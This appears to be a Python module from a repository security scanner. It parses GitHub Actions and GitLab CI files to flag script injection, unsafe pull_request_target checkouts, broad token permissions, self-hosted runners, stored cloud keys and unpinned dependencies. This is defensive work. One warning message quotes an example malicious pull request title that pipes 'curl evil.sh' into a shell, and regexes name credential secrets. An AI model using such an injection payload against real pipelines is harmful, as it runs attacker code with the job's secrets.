"""
CI/CD supply-chain checks: GitHub Actions workflows and GitLab CI pipelines.

Everything here reads the parsed YAML rather than grepping the raw text. The
earlier GitHub Actions checks (moved here from `checks_extra.py`) matched
`pull_request_target` anywhere in a file and `head.sha` anywhere else in it,
and flagged a job-level `contents: write` — which is what least privilege
*looks like* for a release job — as "broad permissions". Parsing costs
nothing extra (the files are already in memory, see `repo_client.py`) and is
the difference between a finding someone acts on and one they learn to ignore.

Two things a static read of the repository cannot see, and so this module
does not pretend to check:
- GitLab's CI_JOB_TOKEN allowlist and whether CI/CD variables are protected
  or masked. Both are project settings, readable only with the Maintainer
  role, and the variables endpoint returns the secret *values* — not
  something this product should ever fetch to answer a yes/no question.
- The popularity of a third-party action. It needs a GitHub API call per
  action, which the free public scanner cannot afford (see `repo_client.py`).
"""
import logging
import re

import yaml
from django.utils.translation import gettext as _

from app.checks import _not_applicable

logger = logging.getLogger(__name__)

MAX_WORKFLOWS = 30
MAX_GITLAB_FILES = 10


# ── YAML ──────────────────────────────────────────────────────────────────────

class _Loader(yaml.SafeLoader):
    """SafeLoader that tolerates GitLab's `!reference [...]` and any other tag."""


def _ignore_tag(loader, tag_suffix, node):
    if isinstance(node, yaml.SequenceNode):
        return loader.construct_sequence(node)
    if isinstance(node, yaml.MappingNode):
        return loader.construct_mapping(node)
    return loader.construct_scalar(node)


_Loader.add_multi_constructor('!', _ignore_tag)


def _load(text):
    try:
        doc = yaml.load(text, Loader=_Loader)  # noqa: S506 — a SafeLoader subclass
    except yaml.YAMLError:
        return None
    return doc if isinstance(doc, dict) else None


def _as_list(value):
    if value is None:
        return []
    return value if isinstance(value, list) else [value]


def _result(check_id, name, severity, passed, description, recommendation=''):
    return {
        'check_id': check_id, 'name': name, 'description': description,
        'severity': severity, 'passed': passed, 'category': 'security',
        'recommendation': '' if passed else recommendation,
    }


def _samples(found, limit=3):
    items = list(dict.fromkeys(found))
    text = '; '.join(items[:limit])
    if len(items) > limit:
        text += ' ' + _('and %(n)d more') % {'n': len(items) - limit}
    return text


# ── GitHub Actions ────────────────────────────────────────────────────────────

# Contexts whose value anyone who can open an issue or a pull request writes.
# The list GitHub Security Lab publishes, less what a repository writer alone
# controls (workflow_dispatch inputs and the like).
_UNTRUSTED = re.compile(
    r'github\.event\.(?:'
    r'(?:issue|pull_request|discussion)\.(?:title|body)'
    r'|(?:comment|review|review_comment|discussion_comment)\.body'
    r'|pages\.[^}\s]*\.page_name'
    r'|commits\.[^}\s]*\.(?:message|author\.(?:email|name))'
    r'|head_commit\.(?:message|author\.(?:email|name))'
    r'|pull_request\.head\.(?:ref|label|repo\.default_branch)'
    r'|workflow_run\.(?:head_branch|head_commit\.(?:message|author\.(?:email|name))|display_title)'
    r')'
    r'|github\.head_ref'
)
_EXPR = re.compile(r'\$\{\{(.*?)\}\}', re.S)

# A ref that makes actions/checkout fetch the pull request's own code.
_PR_HEAD_REF = re.compile(
    r'github\.event\.pull_request\.head\.(?:sha|ref)'
    r'|github\.head_ref'
    r'|github\.event\.workflow_run\.head_(?:sha|branch)'
    r'|refs/pull/'
    r'|github\.event\.(?:number|pull_request\.number)'
)
_PR_CHECKOUT_COMMAND = re.compile(r'\bgh\s+pr\s+checkout\b|git\s+fetch\s+\S+\s+[\'"]?(?:\+?refs/)?pull/')

_PRIVILEGED_TRIGGERS = {'pull_request_target', 'workflow_run'}

# Events someone with no write access can cause. push, schedule, release and
# workflow_dispatch are not here: only people who can already change the
# repository can start those.
_OUTSIDER_TRIGGERS = {
    'pull_request', 'pull_request_target', 'pull_request_review', 'pull_request_review_comment',
    'issues', 'issue_comment', 'discussion', 'discussion_comment', 'fork', 'watch', 'workflow_run',
}

_STATIC_CLOUD_SECRET = re.compile(
    r'secrets\.(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AZURE_CREDENTIALS|AZURE_CLIENT_SECRET'
    r'|GCP_SA_KEY|GCP_CREDENTIALS|GOOGLE_CREDENTIALS'
    r'|[A-Z0-9_]*SERVICE_ACCOUNT_KEY)\b'
)
_CREDENTIALS_JSON = re.compile(r'^\s*credentials_json\s*:', re.M)
_OIDC = re.compile(r'id-token\s*:\s*write')


def _triggers(doc):
    # YAML 1.1 reads a bare `on` key as the boolean True.
    on = doc.get('on', doc.get(True))
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {str(t) for t in on}
    if isinstance(on, dict):
        return {str(t) for t in on}
    return set()


def _jobs(doc):
    jobs = doc.get('jobs')
    if not isinstance(jobs, dict):
        return []
    return [(name, job) for name, job in jobs.items() if isinstance(job, dict)]


def _steps(job):
    return [s for s in _as_list(job.get('steps')) if isinstance(s, dict)]


def _runs_on_labels(job):
    runs_on = job.get('runs-on')
    if isinstance(runs_on, dict):
        return [str(x) for x in _as_list(runs_on.get('labels')) + _as_list(runs_on.get('group'))]
    return [str(x) for x in _as_list(runs_on)]


def _workflows(client):
    names = [f for f in sorted(client.list_dir('.github/workflows'))
             if f.endswith(('.yml', '.yaml'))][:MAX_WORKFLOWS]
    # One parallel read when the archive was too large and the client fell
    # back to a request per file (see repo_client.py).
    prefetch = getattr(client, 'prefetch', None)
    if prefetch:
        prefetch([f'.github/workflows/{f}' for f in names])
    out = []
    for fname in names:
        path = f'.github/workflows/{fname}'
        text = client.get_content(path)
        if not text:
            continue
        out.append((fname, text, _load(text)))
    return out


def check_github_actions(client) -> list[dict]:
    workflows = _workflows(client)
    if not workflows:
        return []

    unpinned, injections, prt, write_all, undeclared, self_hosted = [], [], [], [], [], []
    static_cloud, uses_oidc = [], False

    for fname, text, doc in workflows:
        # Pinning stays a text scan: `uses:` also appears in composite
        # actions and reusable-workflow calls, and a line is a line whether
        # or not the rest of the file parses.
        for m in re.finditer(r'uses:\s*[\'"]?([a-zA-Z0-9_.\-]+/[a-zA-Z0-9_.\-/]+)@([^\s\'"#]+)', text):
            ref = m.group(2).strip()
            if not re.match(r'^[0-9a-f]{40}$', ref) and not ref.startswith('${{'):
                unpinned.append(f'{m.group(1)}@{ref}')

        if _STATIC_CLOUD_SECRET.search(text) or _CREDENTIALS_JSON.search(text):
            static_cloud.append(fname)
        if _OIDC.search(text):
            uses_oidc = True

        if doc is None:
            continue
        triggers = _triggers(doc)
        # A reusable workflow's token is the caller's; its permissions are
        # declared (or not) where it is called, and counted there.
        reusable_only = triggers == {'workflow_call'}
        top_permissions = doc.get('permissions')
        if top_permissions == 'write-all':
            write_all.append(fname)

        for job_name, job in _jobs(doc):
            where = f'{fname} → {job_name}'
            if job.get('permissions') == 'write-all':
                write_all.append(where)
            if (top_permissions is None and 'permissions' not in job and 'uses' not in job
                    and not reusable_only):
                undeclared.append(fname)

            if (triggers & _OUTSIDER_TRIGGERS
                    and any(label.lower() == 'self-hosted' for label in _runs_on_labels(job))):
                self_hosted.append(f'{where} ({", ".join(sorted(triggers & _OUTSIDER_TRIGGERS))})')

            for step in _steps(job):
                uses = str(step.get('uses') or '')
                with_ = step.get('with') if isinstance(step.get('with'), dict) else {}
                scripts = [str(step.get('run') or '')]
                if uses.startswith('actions/github-script@'):
                    scripts.append(str(with_.get('script') or ''))
                for script in scripts:
                    for expr in _EXPR.findall(script):
                        m = _UNTRUSTED.search(expr)
                        if m:
                            injections.append(f'{where}: ${{{{ {m.group(0)} }}}}')

                if triggers & _PRIVILEGED_TRIGGERS:
                    checks_out_head = (
                        uses.startswith('actions/checkout@')
                        and _PR_HEAD_REF.search(str(with_.get('ref') or '') + str(with_.get('repository') or ''))
                    ) or _PR_CHECKOUT_COMMAND.search(str(step.get('run') or ''))
                    if checks_out_head:
                        trigger = sorted(triggers & _PRIVILEGED_TRIGGERS)[0]
                        prt.append(f'{where} ({trigger})')

    checks = []
    unique_unpinned = list(dict.fromkeys(unpinned))
    checks.append(_result(
        'actions.pinned_sha', _('GitHub Actions pinned to a commit SHA'), 'warn', not unique_unpinned,
        (_('%(n)d action(s) are referenced by a moving tag, for example %(sample)s. '
           'A tag can be repointed at malicious code without any change on your side.')
         % {'n': len(unique_unpinned), 'sample': unique_unpinned[0]})
        if unique_unpinned else _('Every third-party action is pinned to a commit SHA.'),
        _('Reference actions by full commit SHA:') + '\n'
        '  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\n'
        + _('Tools such as pin-github-action or Dependabot can do this and keep it updated.'),
    ))

    checks.append(_result(
        'actions.script_injection', _('No script injection in workflows'), 'crit', not injections,
        (_('Text an outsider controls — an issue or pull request title, a branch name, a '
           'comment — is pasted straight into a shell script: %(where)s. A title such as '
           '"a"; curl evil.sh | sh; echo " runs as code, with the job\'s token and secrets.')
         % {'where': _samples(injections)})
        if injections else
        _('No workflow pastes an issue, pull request, comment or branch name into a script.'),
        _('Pass the value through an environment variable, which the shell treats as data:') + '\n'
        '  - env:\n'
        '      TITLE: ${{ github.event.pull_request.title }}\n'
        '    run: echo "$TITLE"\n'
        + _('Never write ${{ … }} with untrusted input inside run: or a github-script script.'),
    ))

    checks.append(_result(
        'actions.pull_request_target', _('No unsafe pull_request_target workflow'), 'crit', not prt,
        (_('A workflow that runs with your secrets checks out code from the pull request: '
           '%(where)s. Anyone who opens a pull request can run code with access to those '
           'secrets and a write token.') % {'where': _samples(prt)})
        if prt else
        _('No pull_request_target or workflow_run workflow checks out pull request code.'),
        _('Never check out PR code inside pull_request_target. Split the workflow in two:\n'
          '  1. Untrusted (on: pull_request) — reads the code, has no secrets.\n'
          '  2. Trusted (on: workflow_run) — has secrets, never checks out PR code.'),
    ))

    unique_undeclared = list(dict.fromkeys(undeclared))
    if write_all:
        perm_desc = (_('%(where)s grants write-all: every scope of the job token, to every '
                       'step, including third-party actions.') % {'where': _samples(write_all)})
    elif unique_undeclared:
        perm_desc = (_('%(where)s declares no permissions, so the job token gets the repository '
                       'default — read and write on older repositories and organisations.')
                     % {'where': _samples(unique_undeclared)})
    else:
        perm_desc = _('Every workflow declares the permissions its token gets.')
    checks.append(_result(
        'actions.broad_permissions', _('Workflow permissions are least-privilege'), 'warn',
        not write_all and not unique_undeclared, perm_desc,
        _('Declare the minimum at the top of each workflow, and widen it only on the job '
          'that needs more:\n'
          'permissions:\n'
          '  contents: read\n'
          '  pull-requests: write  # only where it is actually used'),
    ))

    exposed = not client.is_private and bool(self_hosted)
    checks.append(_result(
        'actions.self_hosted_public', _('No self-hosted runners in a public repository'), 'crit',
        not exposed,
        (_('This repository is public and %(where)s runs on a self-hosted runner on an event '
           'anyone can cause. A pull request from a fork can run arbitrary code on that '
           'machine and stay on it.') % {'where': _samples(self_hosted)})
        if exposed else
        _('No self-hosted runner can be started by someone outside the repository.'),
        _('Use GitHub-hosted runners for anything a fork can trigger. If a self-hosted runner is '
          'unavoidable, make it ephemeral (--ephemeral), put it in a runner group restricted '
          'to private repositories, and require approval for fork pull requests.'),
    ))

    oidc = _result(
        'actions.cloud_oidc', _('Cloud deploys use short-lived credentials (OIDC)'), 'warn',
        not static_cloud,
        (_('%(where)s deploys with a long-lived cloud key stored as a secret. It works until '
           'someone leaks it, and then it works for them.') % {'where': _samples(static_cloud)})
        if static_cloud else
        _('Cloud access from workflows uses OpenID Connect instead of a stored key.'),
        _('Let the cloud trust GitHub\'s OIDC token instead of storing a key:') + '\n'
        'permissions:\n'
        '  id-token: write\n'
        '  contents: read\n'
        '- uses: aws-actions/configure-aws-credentials@<sha>\n'
        '  with:\n'
        '    role-to-assume: arn:aws:iam::123456789012:role/deploy\n'
        + _('Then delete the stored key and revoke it.'),
    )
    if not static_cloud and not uses_oidc:
        _not_applicable(oidc, _('No workflow authenticates to a cloud provider.'))
    checks.append(oidc)
    return checks


# ── GitLab CI ─────────────────────────────────────────────────────────────────

_FLOATING_REFS = {'main', 'master', 'develop', 'dev', 'head', 'trunk', 'latest', '~latest'}
_GITLAB_KEYWORDS = {
    'default', 'include', 'stages', 'variables', 'workflow', 'image', 'services',
    'cache', 'before_script', 'after_script', 'types',
}  # not `pages`: that is the GitLab Pages *job*, and it runs an image like any other
# Not GOOGLE_APPLICATION_CREDENTIALS: it is a *path* to a credentials file,
# and Workload Identity Federation — the OIDC setup this check recommends —
# sets it the same way (gitlab-org/cli does exactly that, via GitLab's own
# oidc-modules include).
_GITLAB_STATIC_CLOUD = re.compile(
    r'\b(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AZURE_CLIENT_SECRET|GCP_SA_KEY'
    r'|GOOGLE_CREDENTIALS|GCP_SERVICE_ACCOUNT_KEY)\b'
)


def _gitlab_documents(client):
    """`.gitlab-ci.yml` plus the local files it includes, one level deep."""
    text = client.get_content('.gitlab-ci.yml')
    if not text:
        return []
    root = _load(text)
    docs = [('.gitlab-ci.yml', text, root)]
    if root is None:
        return docs
    for entry in _as_list(root.get('include')):
        path = entry if isinstance(entry, str) else (entry.get('local') if isinstance(entry, dict) else None)
        if not isinstance(path, str) or path.startswith(('http://', 'https://')) or '*' in path:
            continue
        path = path.lstrip('/')
        included = client.get_content(path)
        if included:
            docs.append((path, included, _load(included)))
        if len(docs) >= MAX_GITLAB_FILES:
            break
    return docs


def _include_problem(entry):
    if isinstance(entry, str):
        if entry.startswith(('http://', 'https://')):
            return _('remote %(url)s') % {'url': entry}
        return None
    if not isinstance(entry, dict):
        return None
    if 'remote' in entry and not entry.get('integrity'):
        return _('remote %(url)s') % {'url': entry['remote']}
    if 'project' in entry:
        ref = str(entry.get('ref') or '')
        if not ref:
            return _('project %(project)s with no ref') % {'project': entry['project']}
        if ref.lower() in _FLOATING_REFS:
            return _('project %(project)s at branch %(ref)s') % {'project': entry['project'], 'ref': ref}
    if 'component' in entry:
        component = str(entry['component'])
        version = component.rsplit('@', 1)[1] if '@' in component else ''
        if not version or version.lower() in _FLOATING_REFS:
            return _('component %(c)s') % {'c': component}
    return None


def _image_name(value):
    if isinstance(value, dict):
        value = value.get('name')
    return value if isinstance(value, str) else None


def _image_problem(image):
    if not image or '$' in image:
        return None  # built from variables — usually the pipeline's own tagged image
    if '@sha256:' in image:
        return None
    last = image.rsplit('/', 1)[-1]
    if ':' not in last:
        return image
    if last.rsplit(':', 1)[1] == 'latest':
        return image
    return None


def check_gitlab_ci(client) -> list[dict]:
    docs = _gitlab_documents(client)
    if not docs:
        return []

    includes, images, static_cloud, uses_oidc = [], [], [], False
    for path, text, doc in docs:
        if _GITLAB_STATIC_CLOUD.search(text):
            static_cloud.append(path)
        if re.search(r'^\s*id_tokens\s*:', text, re.M):
            uses_oidc = True
        if doc is None:
            continue
        for entry in _as_list(doc.get('include')):
            problem = _include_problem(entry)
            if problem:
                includes.append(problem)

        holders = [doc, doc.get('default') if isinstance(doc.get('default'), dict) else {}]
        holders += [job for name, job in doc.items()
                    if isinstance(job, dict) and str(name) not in _GITLAB_KEYWORDS]
        for holder in holders:
            for value in [holder.get('image')] + _as_list(holder.get('services')):
                problem = _image_problem(_image_name(value))
                if problem:
                    images.append(problem)

    checks = [
        _result(
            'gitlab_ci.pinned_includes', _('GitLab CI includes are pinned'), 'warn', not includes,
            (_('The pipeline pulls in configuration that can change under it: %(what)s. '
               'Whoever controls that file controls what your jobs run.')
             % {'what': _samples(includes)})
            if includes else
            _('Every included pipeline file is local, a GitLab template, or pinned to a version.'),
            _('Pin every include to something that cannot move:') + '\n'
            'include:\n'
            '  - project: my-group/ci-templates\n'
            '    ref: v1.4.2            # a tag or a commit SHA, not a branch\n'
            '    file: /build.yml\n'
            '  - component: gitlab.com/my-group/my-component@1.2.0\n'
            '  - remote: https://example.com/ci.yml\n'
            '    integrity: sha256-…    # GitLab 17.9+\n',
        ),
        _result(
            'gitlab_ci.pinned_images', _('GitLab CI images are pinned'), 'warn', not images,
            (_('%(n)d job image(s) have no tag or use :latest, for example %(sample)s. '
               'Every pipeline run can pull a different image.')
             % {'n': len(set(images)), 'sample': sorted(set(images))[0]})
            if images else
            _('Every job image and service names a tag or a digest.'),
            _('Name an exact version, or better a digest:') + '\n'
            '  image: python:3.12.7-slim\n'
            '  image: python@sha256:<digest>   # cannot be repointed\n'
            + _('Renovate can keep either up to date.'),
        ),
    ]
    oidc = _result(
        'gitlab_ci.cloud_oidc', _('Cloud deploys use short-lived credentials (OIDC)'), 'warn',
        not static_cloud,
        (_('%(where)s deploys with a long-lived cloud key stored as a CI/CD variable. It works '
           'until someone leaks it, and then it works for them.')
         % {'where': _samples(static_cloud)})
        if static_cloud else
        _('Cloud access from the pipeline uses OpenID Connect instead of a stored key.'),
        _('Let the cloud trust GitLab\'s ID token instead of storing a key:') + '\n'
        'deploy:\n'
        '  id_tokens:\n'
        '    AWS_TOKEN:\n'
        '      aud: https://gitlab.com\n'
        '  script:\n'
        '    - aws sts assume-role-with-web-identity --web-identity-token "$AWS_TOKEN" …\n'
        + _('Then delete the stored key and revoke it.'),
    )
    if not static_cloud and not uses_oidc:
        _not_applicable(oidc, _('The pipeline does not authenticate to a cloud provider.'))
    checks.append(oidc)
    return checks
